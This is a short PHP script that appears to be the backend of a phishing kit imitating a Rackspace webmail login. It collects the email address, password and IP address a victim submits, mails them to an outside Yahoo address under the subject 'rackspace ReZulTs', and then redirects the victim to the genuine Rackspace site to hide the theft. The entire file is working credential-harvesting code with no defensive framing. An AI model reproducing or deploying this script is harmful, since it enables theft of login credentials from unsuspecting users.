<?
$ip = getenv("REMOTE_ADDR");
$message .= "------Rackspace.com RESULT------------------------------\n";
$message .= "Email Address: ".$_POST['user_name']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------------Created By PopPA------------------\n";
$send = "adeniji_ibrahim@yahoo.com";
$subject = "rackspace ReZulTs";
$headers = "From: INFO@zoo.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://apps.rackspace.com");
	  

?>